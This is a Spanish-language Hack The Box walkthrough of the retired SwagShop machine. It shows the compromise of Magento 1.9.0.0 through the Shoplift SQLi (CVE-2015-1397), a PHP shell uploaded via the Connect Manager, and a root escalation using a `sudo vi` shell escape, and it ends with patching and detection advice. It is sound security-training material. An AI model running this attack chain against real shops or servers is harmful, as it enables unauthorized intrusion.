---
machine: SwagShop
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, magento, sqli, cve-2015-1397, connect-manager, sudo, vi, gtfobins]
---

# SwagShop — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Magento 1.9.0.0 con la **SQLi Shoplift (CVE-2015-1397)**, que crea un usuario administrador. Desde el panel se llega al **Magento Connect Manager** (`/downloader`) y se sube un paquete con un shell PHP → `www-data`. La escalada es un `sudo` sobre `vi` limitado al webroot: escape de GTFOBins.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 ((Ubuntu))
```

```bash
echo "<IP> swagshop.htb" | sudo tee -a /etc/hosts
gobuster dir -u http://swagshop.htb -w /usr/share/wordlists/dirb/common.txt
```

Aparecen `/index.php/admin`, `/downloader` y `/app/etc/local.xml` (que confirma Magento y la versión).

## Enumeración

- `/index.php/admin` muestra el panel de Magento y el pie confirma `Magento ver. 1.9.0.0`.
- `/downloader` es el **Magento Connect Manager**; `/app/etc/local.xml` confirma la instalación y su versión.
- Los `searchsploit` útiles son la SQLi *Shoplift* (37977) y el RCE autenticado por paquete (37811); el segundo exige ser admin, así que el orden importa.
- En instancias parcheadas `/downloader` ya no existe: entonces la vía es la inyección en plantilla de admin (*Froghopper*).

## Foothold

1. **Crear admin con la SQLi**:

```bash
searchsploit -m 37977
python2 37977.py        # editar la URL del objetivo
```

```text
WORKED
Check http://swagshop.htb/index.php/admin with creds <user>:<password>
```

2. **Connect Manager**: con la sesión de admin, `http://swagshop.htb/downloader/` permite subir un paquete. Se empaqueta un `shell.php` dentro de la estructura de un módulo y se instala; el shell queda accesible en la ruta del paquete.

3. **Shell** como `www-data` en `/var/www/html`.

## Movimiento lateral

No aplica: `www-data` es el usuario final y la escalada se resuelve con la regla `sudo` sobre `vi`. El único salto es de aplicación a sistema: panel de Magento → Connect Manager → shell PHP.

## Escalada de privilegios

```bash
sudo -l
```

```text
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

Escape clásico:

```bash
sudo /usr/bin/vi /var/www/html/index.php -c ':!/bin/sh'
# o dentro de vi:  :set shell=/bin/bash  y  :shell
```

```text
root@swagshop:/var/www/html# id
uid=0(root)
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`/downloader` deshabilitado**: si el Connect Manager no está, la vía alternativa es *Froghopper* (inyección en plantilla de admin) para ejecutar PHP.
- **Ruta del shell**: depende de cómo se empaquete; conviene listar el directorio tras instalar.
- **`vi` con comodín**: la regla `sudo` incluye `/var/www/html/*`, así que hay que escribir el fichero dentro de esa ruta.

- Una SQLi que permite insertar un admin convierte un CMS en RCE por su propio panel de extensiones.
- `sudo` sobre `vi`/`vim` con comodines es root: el editor ejecuta comandos.
- Mitigación: parchear Magento, quitar el Connect Manager y no dar `sudo` sobre editores.

## Mitigaciones y detección

- Aplicar SUPEE-5344 (y el resto de parches de Magento 1) o migrar: 1.9.0.0 acumula SQLi y RCE conocidos.
- Eliminar `/downloader` (Connect Manager) del servidor y restringir la instalación de paquetes.
- `sudo` sobre `vi`/`vim` con comodín (`/var/www/html/*`) es root: usar editores sin shell o retirar la regla.
- Consultas parametrizadas en la capa de base de datos y permisos mínimos para el usuario de Magento.
- Detección: peticiones a `admin_user` con `INSERT` desde parámetros públicos, escrituras en `app/code/local` y `sudo vi` seguido de `sh`.

## Referencias

- [CVE-2015-1397](https://nvd.nist.gov/vuln/detail/CVE-2015-1397)
